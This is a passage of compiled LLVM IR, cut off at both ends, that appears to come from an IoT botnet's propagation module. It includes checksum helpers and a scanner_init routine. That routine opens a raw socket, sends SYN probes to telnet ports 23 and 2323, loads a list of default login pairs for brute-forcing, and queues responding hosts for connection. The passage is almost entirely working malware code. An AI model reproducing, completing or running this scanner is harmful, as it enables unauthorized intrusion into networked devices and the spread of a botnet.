  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !4

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !6

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !7

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 28)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 28, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %8, %.lr.ph ], [ %1, %.lr.ph.preheader ]
  %.012 = phi i8* [ %11, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %8 = add nsw i32 %.03, -1
  %9 = call i32 @util_strlen(i8* nonnull %4) #10
  %10 = load i8, i8* %4, align 16
  %11 = getelementptr inbounds i8, i8* %.012, i64 1
  store i8 %10, i8* %.012, align 1
  %12 = icmp eq i32 %8, 0
  br i1 %12, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() local_unnamed_addr #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set.28, align 8
  %3 = alloca %struct.fd_set.28, align 8
  %4 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %4 to %struct.timeval.29*
  %5 = alloca [1514 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = tail call i32 @fork() #10
  store i32 %13, i32* @scanner_pid, align 4
  %14 = icmp sgt i32 %13, 0
  %15 = icmp eq i32 %13, -1
  %or.cond = or i1 %14, %15
  br i1 %or.cond, label %16, label %17

; <label>:16:                                     ; preds = %0
  ret void

; <label>:17:                                     ; preds = %0
  %18 = tail call i32 @util_local_addr() #10
  store i32 %18, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init() #10
  %19 = tail call i64 @time(i64* null) #10
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @fake_time, align 4
  %21 = tail call noalias i8* @calloc(i64 256, i64 296) #10
  store i8* %21, i8** bitcast (%struct.scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  %.cast = bitcast i8* %21 to %struct.scanner_connection*
  br label %22

; <label>:22:                                     ; preds = %22, %17
  %indvars.iv247 = phi i64 [ 0, %17 ], [ %indvars.iv.next248.7, %22 ]
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv247, i32 1
  store i32 -1, i32* %23, align 8
  %indvars.iv.next248 = or i64 %indvars.iv247, 1
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248, i32 1
  store i32 -1, i32* %24, align 8
  %indvars.iv.next248.1 = or i64 %indvars.iv247, 2
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.1, i32 1
  store i32 -1, i32* %25, align 8
  %indvars.iv.next248.2 = or i64 %indvars.iv247, 3
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.2, i32 1
  store i32 -1, i32* %26, align 8
  %indvars.iv.next248.3 = or i64 %indvars.iv247, 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.3, i32 1
  store i32 -1, i32* %27, align 8
  %indvars.iv.next248.4 = or i64 %indvars.iv247, 5
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.4, i32 1
  store i32 -1, i32* %28, align 8
  %indvars.iv.next248.5 = or i64 %indvars.iv247, 6
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.5, i32 1
  store i32 -1, i32* %29, align 8
  %indvars.iv.next248.6 = or i64 %indvars.iv247, 7
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.6, i32 1
  store i32 -1, i32* %30, align 8
  %indvars.iv.next248.7 = add nsw i64 %indvars.iv247, 8
  %exitcond.7 = icmp eq i64 %indvars.iv.next248.7, 256
  br i1 %exitcond.7, label %31, label %22

; <label>:31:                                     ; preds = %22
  store i32 256, i32* %1, align 4
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  store i32 %32, i32* @rsck, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %31
  tail call void @exit(i32 0) #12
  unreachable

; <label>:35:                                     ; preds = %31
  %36 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0) #10
  %37 = or i32 %36, 2048
  %38 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 4, i32 %37) #10
  store i32 1, i32* %1, align 4
  %39 = load i32, i32* @rsck, align 4
  %40 = bitcast i32* %1 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %.preheader215, label %45

.preheader215:                                    ; preds = %35
  %43 = call zeroext i16 @ntohs(i16 zeroext 0) #11
  %44 = icmp ult i16 %43, 1024
  br i1 %44, label %.preheader215.split.preheader, label %.split

.preheader215.split.preheader:                    ; preds = %.preheader215
  br label %.preheader215.split

; <label>:45:                                     ; preds = %35
  %46 = load i32, i32* @rsck, align 4
  %47 = call i32 @close(i32 %46) #10
  call void @exit(i32 0) #12
  unreachable

.preheader215.split:                              ; preds = %.preheader215.split.preheader, %.preheader215.split
  br label %.preheader215.split

.split:                                           ; preds = %.preheader215
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), align 16
  %48 = call zeroext i16 @htons(i16 zeroext 40) #11
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 9), align 1
  %49 = call zeroext i16 @htons(i16 zeroext 23) #11
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %50 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = and i16 %50, -753
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %52 = or i16 %51, 592
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i16 zeroext 14)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i16 zeroext 11)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i16 zeroext 17)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0), i16 zeroext 15)
  %53 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 0
  %54 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 20
  %55 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 0
  %56 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 0
  %57 = bitcast i32* %6 to i8*
  %58 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 16
  %59 = bitcast i8* %58 to i32*
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 9
  %61 = bitcast i8* %54 to i16*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 22
  %63 = bitcast i8* %62 to i16*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 32
  %65 = bitcast i8* %64 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 28
  %67 = bitcast i8* %66 to i32*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 12
  %69 = bitcast i8* %68 to i32*
  br label %.loopexit213

.loopexit213.loopexit:                            ; preds = %.loopexit
  br label %.loopexit213

.loopexit213:                                     ; preds = %.loopexit213.loopexit, %.split
  %70 = tail call i32* @__errno_location() #11
  store i32 0, i32* %70, align 4
  %71 = load i32, i32* @rsck, align 4
  %72 = call i64 @recvfrom(i32 %71, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %73 = trunc i64 %72 to i32
  %74 = icmp slt i32 %73, 1
  br i1 %74, label %.thread, label %.lr.ph226.preheader

.lr.ph226.preheader:                              ; preds = %.loopexit213
  br label %.lr.ph226

.lr.ph226:                                        ; preds = %.lr.ph226.preheader, %.backedge
  %75 = phi i64 [ %125, %.backedge ], [ %72, %.lr.ph226.preheader ]
  %.0225 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph226.preheader ]
  %76 = load i32, i32* %70, align 4
  %77 = icmp eq i32 %76, 11
  br i1 %77, label %.thread.loopexit256, label %78

; <label>:78:                                     ; preds = %.lr.ph226
  %sext = shl i64 %75, 32
  %79 = ashr exact i64 %sext, 32
  %80 = icmp ult i64 %79, 40
  br i1 %80, label %.backedge, label %81

; <label>:81:                                     ; preds = %78
  %82 = load i32, i32* %59, align 16
  %83 = load i32, i32* @LOCAL_ADDR, align 4
  %84 = icmp eq i32 %82, %83
  %85 = load i8, i8* %60, align 1
  %86 = icmp eq i8 %85, 6
  %or.cond240 = and i1 %84, %86
  br i1 %or.cond240, label %87, label %.backedge

; <label>:87:                                     ; preds = %81
  %88 = load i16, i16* %61, align 4
  %89 = icmp eq i16 %88, %49
  br i1 %89, label %95, label %90

; <label>:90:                                     ; preds = %87
  %91 = call zeroext i16 @htons(i16 zeroext 2323) #11
  %92 = icmp eq i16 %88, %91
  %93 = load i16, i16* %63, align 2
  %94 = icmp eq i16 %93, 0
  %or.cond242 = and i1 %92, %94
  br i1 %or.cond242, label %96, label %.backedge

; <label>:95:                                     ; preds = %87
  %.old = load i16, i16* %63, align 2
  %.old241 = icmp eq i16 %.old, 0
  br i1 %.old241, label %96, label %.backedge

; <label>:96:                                     ; preds = %90, %95
  %97 = load i16, i16* %65, align 16
  %98 = and i16 %97, 5888
  %99 = icmp eq i16 %98, 4608
  br i1 %99, label %100, label %.backedge

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %67, align 4
  %102 = call i32 @ntohl(i32 %101) #11
  %103 = add i32 %102, -1
  %104 = call i32 @htonl(i32 %103) #11
  %105 = load i32, i32* %69, align 4
  %106 = icmp eq i32 %104, %105
  br i1 %106, label %.preheader, label %.backedge

.preheader:                                       ; preds = %100
  %107 = icmp slt i32 %.0225, 256
  br i1 %107, label %.lr.ph, label %.thread.loopexit256

.lr.ph:                                           ; preds = %.preheader
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %109 = sext i32 %.0225 to i64
  br label %110

; <label>:110:                                    ; preds = %.lr.ph, %114
  %indvars.iv = phi i64 [ %109, %.lr.ph ], [ %indvars.iv.next, %114 ]
  %111 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 3
  %112 = load i32, i32* %111, align 8
  %113 = icmp eq i32 %112, 0
  br i1 %113, label %116, label %114

; <label>:114:                                    ; preds = %110
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %115 = icmp slt i64 %indvars.iv.next, 256
  br i1 %115, label %110, label %.thread.loopexit

; <label>:116:                                    ; preds = %110
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv
  %118 = icmp eq %struct.scanner_connection* %117, null
  br i1 %118, label %.thread.loopexit256, label %119

; <label>:119:                                    ; preds = %116
  %120 = trunc i64 %indvars.iv to i32
  %121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 4
  store i32 %104, i32* %121, align 4
  %122 = load i16, i16* %61, align 4
  %123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 5
  store i16 %122, i16* %123, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %117)
  br label %.backedge

.backedge:                                        ; preds = %119, %78, %81, %95, %100, %90, %96
